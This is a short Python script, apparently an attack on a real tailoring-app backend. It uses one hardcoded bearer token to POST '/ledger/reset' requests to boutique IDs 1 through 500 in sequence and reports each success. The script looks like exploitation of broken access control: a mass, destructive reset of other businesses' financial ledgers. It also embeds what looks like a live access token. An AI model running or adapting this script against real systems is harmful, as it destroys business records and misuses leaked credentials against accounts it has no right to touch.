import requests

base_url = "https://backend.darzeeapp.com/boutique"
endpoint = "/ledger/reset"
headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI3MDkwMzIxNzYxIiwiZXhwIjoyMDAzMTcwMzEyLCJpYXQiOjE2ODc4MTAzMTJ9.HwzkaF9xv4PWuOUY128c4N9Yr8siPsxVvF3iNp9mHkRXw6O409zVUHEuoLsTALA3n17efCbBDBDmdJPK7_YTCg"
}

for boutique_id in range(1, 501):
    url = f"{base_url}/{boutique_id}{endpoint}"
    response = requests.post(url, headers=headers)

    if response.status_code == 200:
        print(f"Reset successful for boutique {boutique_id}")
    else:
        print(f"Error resetting boutique {boutique_id}. Status code: {response.status_code}")
        print("Response:", response.text)
